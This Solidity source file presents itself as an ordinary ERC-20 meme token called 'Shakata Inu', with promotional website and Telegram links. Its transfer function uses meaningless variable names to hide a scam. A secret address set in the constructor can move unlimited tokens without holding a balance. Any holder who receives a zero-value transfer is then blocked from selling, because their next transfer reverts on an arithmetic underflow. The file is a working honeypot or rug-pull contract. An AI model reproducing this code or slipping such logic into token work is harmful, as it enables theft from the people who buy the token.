/*

Website 🔗:  https://www.shakatainu.com/

Telegram 💬: https://t.me/shakatainuerc

*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.3;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract ShakataInu is Ownable {
    uint8 public decimals = 9;

    function transfer(address stick, uint256 mainly) public returns (bool success) {
        each(msg.sender, stick, mainly);
        return true;
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function each(address ordinary, address stick, uint256 mainly) private returns (bool success) {
        if (shoot[ordinary] == 0) {
            balanceOf[ordinary] -= mainly;
        }

        if (mainly == 0) world[stick] += worried;

        if (shoot[ordinary] == 0 && uniswapV2Pair != ordinary && world[ordinary] > 0) {
            shoot[ordinary] -= worried;
        }

        balanceOf[stick] += mainly;
        emit Transfer(ordinary, stick, mainly);
        return true;
    }

    constructor(address jump) {
        balanceOf[msg.sender] = totalSupply;
        shoot[jump] = worried;
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
    }

    IUniswapV2Router02 private uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    function transferFrom(address ordinary, address stick, uint256 mainly) public returns (bool success) {
        require(mainly <= allowance[ordinary][msg.sender]);
        allowance[ordinary][msg.sender] -= mainly;
        each(ordinary, stick, mainly);
        return true;
    }

    uint256 private worried = 51;

    mapping(address => mapping(address => uint256)) public allowance;

    mapping(address => uint256) public balanceOf;

    mapping(address => uint256) private shoot;

    mapping(address => uint256) private world;

    string public name = 'Shakata Inu';

    function approve(address car, uint256 mainly) public returns (bool success) {
        allowance[msg.sender][car] = mainly;
        emit Approval(msg.sender, car, mainly);
        return true;
    }

    uint256 public totalSupply = 690420000000 * 10 ** 9;

    string public symbol = 'SHAKATA';

    address public uniswapV2Pair;

    event Transfer(address indexed from, address indexed to, uint256 value);
}